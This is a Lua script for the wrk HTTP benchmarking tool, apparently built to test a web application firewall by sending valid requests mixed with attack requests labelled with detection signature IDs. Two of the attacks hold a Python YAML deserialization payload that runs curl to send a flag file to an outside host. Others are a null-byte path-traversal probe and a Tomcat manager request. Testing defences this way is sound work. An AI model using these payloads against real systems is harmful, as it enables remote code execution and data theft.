math.randomseed(os.time())

local threads = {}
local threadCount = 0
local requestCount = {}

local pathCount = 30

local requestTypes = {}
table.insert(requestTypes,{weight = 1, type = 'VALID'})
table.insert(requestTypes,{weight = 1, type = 'ATTACK'})

local paths = {'aaa','bbb','ccc','ddd','eee'}
local files = {'index.html', 'home.asp', 'login.php','location.js','randomFile.me'}


local methods = {}
table.insert(methods,{weight = 1, method = 'GET'})
table.insert(methods,{weight = 1, method = 'POST'})
table.insert(methods,{weight = 1, method = 'HEAD'})
table.insert(methods,{weight = 0, method = 'PUT'})
table.insert(methods,{weight = 0, method = 'DELETE'})

local attacks = {}
attacks[1] = {weight = 1, method = 'GET', path = '/oncomplete=alert/a%00/../test.config', technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200101029]='Detection Evasion'}}
attacks[2] = {weight = 1, method = 'GET', path = '/', params = {v='!!python/object/apply:os.system [""curl https://crowdshield.com/?`cat flag.txt`""]'}, headers = { first = 'num.toString()' }, technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004329]='Server Side Code Injection',[200001683] = 'Cross Site Scripting'}}
attacks[3] = {weight = 1, method = 'GET', path = '/num.toString()', headers = { first = '"!!python/object/apply:"; nocase;' }, technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004330]='Server Side Code Injection',[200001684] = 'Cross Site Scripting'}}
attacks[4] = {weight = 1, method = 'GET', path = '/manager/html/reload', headers = { first = '!!python/object/apply:os.system [""curl https://crowdshield.com/?`cat flag.txt`""]' },technology_stacks = {'APACHE_TOMCAT','JAVASCRIPT','PYTHON'}, signature_ids = {[200004330]='Server Side Code Injection',[200010061] = 'Predictable Resource Location'}}

function weightedFilter(obj)
    local weights = 0;
    local newObj = {}
    for k,v in pairs(obj) do
      if v.weight > 0 then
        table.insert(newObj,v)
      end
    end
    return newObj
end

function weightedSearch(obj)
    if #obj > 0 then
        obj = weightedFilter(obj)
        local weights = 0
        for k,v in pairs(obj) do
          weights = weights + v.weight
        end

        local random = math.random(weights)

        for k,v in pairs(obj) do
            random = random - v.weight
            if random <= 0 then
                return(v)
            end
        end
    else
        for k,v in pairs(obj) do
            return(v)
        end
    end
end

function getEndpoint(host)
    if not host.port then
        if host.scheme == 'http' then
            host.port = 80
        elseif host.scheme == 'https' then
            host.port = 443
        else
            host.port = 80
        end
    end
    if not host.addr then
        host.addr = wrk.lookup(host.address,host.port)
    end
    return host
end

function setup(thread)
    thread:set("id", threadCount)
    table.insert(threads, thread)

    threadCount = threadCount + 1
end


function init(args)
    for k,v in pairs(args) do
        local index = string.find(v,'=')
        if index then
            local left = string.sub(v,0,index-1)
            local right = string.sub(v,index+1)

            if left == 'proxy_addr' then proxy_addr = right end
            if left == 'proxy_port' then proxy_port = right end
        end
    end

    if proxy_addr and proxy_port then
        wrk.orginalAddr = wrk.thread.addr
        print('magic')
        wrk.thread.addr = wrk.lookup(proxy_addr , proxy_port)[1]
    end

    requests = 0
end

-- Checks if file exists
function file_exists(file)
    local f = io.open(file, "rb")
    if f then f:close() end
    return f ~= nil
end

-- loads non-empty lines into a list
function non_empty_lines_from(file)
    if not file_exists(file) then return {} end
    lines = {}
    for line in io.lines(file) do
        if not (line == '') then
            lines[#lines + 1] = line
        end
    end
    return lines
end

-- Loads collection of UserAgent strings into variable
userAgents = non_empty_lines_from("lua_useragents.txt")

function request()
    -- Cleanup WRK Values so that everything is fresh
    wrk.scheme  = "http"
    wrk.host    = "localhost"
    wrk.port    = nil
    wrk.method  = "GET"
    wrk.path    = "/"
    wrk.headers = {}
    wrk.body    = nil

    local attack = false
    local params = false
    local headers = false
    local method = 'GET' -- DEFAULT Method should be a GET if it fails to set anywhere else
    local path = '/' -- DEFAULT URI should be a / if it fails to set anywhere else

    if weightedSearch(requestTypes).type == "ATTACK" then
        attack = weightedSearch(attacks)
    end

    if attack then
        wrk.method = attack.method
        if attack.path then
            path = attack.path
        end
        if attack.body and (attack.method == 'POST' or attack.method == 'PUT') then
            wrk.body = attack.body
        end
        if attack.params then
            for k,v in pairs(attack.params) do
                if not params then
                    params = '?' .. k .. '=' .. v
                else
                    params = '&' .. k .. '=' .. v
                end
            end
        end
        if attack.headers then
            for k,v in pairs(attack.headers) do
                wrk.headers[k] = v
            end
        end
    else
        wrk.method = weightedSearch(methods).method
        if wrk.method == 'POST' or wrk.method == 'PUT' then
            wrk.body = 'foo=bar&baz=quux'
        end
    end

    if path == '/' then
        path = '/%d/%s/%s'
        if params then
            path = path..params
        end
        path = path:format((requests % pathCount)+1,paths[(requests % #paths)+1],files[(requests % #files)+1])
    end

    -- If proxy_addr and proxy_port were specified as variables then this updates the HOST header
    if wrk.orginalAddr then
        wrk.headers['Host'] = wrk.orginalAddr
    end

    wrk.headers['User-Agent'] = userAgents[math.random(#userAgents)]
    wrk.path = path

    requests = requests + 1

    return wrk.format(nil,path)
end
